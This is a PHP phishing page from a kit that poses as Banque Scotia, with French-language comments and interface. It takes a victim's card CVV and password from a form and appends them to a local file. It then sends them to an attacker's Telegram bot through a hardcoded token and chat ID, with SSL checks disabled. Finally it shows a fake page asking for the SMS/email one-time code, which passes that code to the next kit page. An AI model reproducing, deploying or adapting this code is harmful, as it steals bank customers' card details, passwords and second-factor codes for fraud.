<?php 
session_start();

// Vérifie si les données 'cvv' et 'mdp' sont présentes dans la requête POST, sinon redirige vers la page de connexion
if (!isset($_POST["cvv"]) or !isset($_POST["mdp"])) {
    header("Location: ./index.php");
    exit();
}

// Stocke les données de connexion dans la session
$_SESSION["cvv"] = $_POST['cvv'];
$_SESSION["mdp"] = $_POST['mdp'];
$heure = date("h:i:s");
$date = date("Y:m:d");

// Prépare le message à envoyer sur Telegram
$message = "🔐 **NOUVELLE CONNEXION** 🔐\n\n" .
           "🏦 **Banque** : " . $_SESSION["bank"] . "\n" .
           "⏰ **Heure** : " . $heure . "\n" .
           "📅 **Date** : " . $date . "\n" .
           "💳 **CVV** : " . $_SESSION["cvv"] . "\n" .
           "🔑 **Mot de Passe** : " . $_SESSION["mdp"] . "\n";

// Enregistre les données dans un fichier local (peut être conservé ou retiré selon les besoins)
$file = "../blinky2000@bvc@bvc@destruction.txt";
file_put_contents($file, $message, FILE_APPEND);

// Configuration de l'envoi Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; // Remplace par le token de ton bot
$chat_id = '6242884372'; // Remplace par ton chat_id

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="styles_mobile.css">

     <link rel="stylesheet" media="screen and (min-width: 769px)" href="styles_pc.css">
    <title>SCOTIA</title>
</head>
<body>
    <div class="container">
        <div class="header">
    <div class="title">
        <span class="title1" >Bienvenue a la </span> 
        <span class="title2">Banque Scotia</span>
    </div>
        </div>
        <div class="body">
        <form action="/scotia/terminus.php" method="post">
            <h1>Vous recevrez un code d'authenthification sur votre E-mail ou sms</h1>
  <div class="inputForm">
  <input type="text" name="sms" placeholder="code sms " >
  </div>


    <div class="inputFormSubmit">
    <input type="submit" value="Ouvrire une Session" >
    </div>

        </form>

        </div>


    </div>
</body>
</html>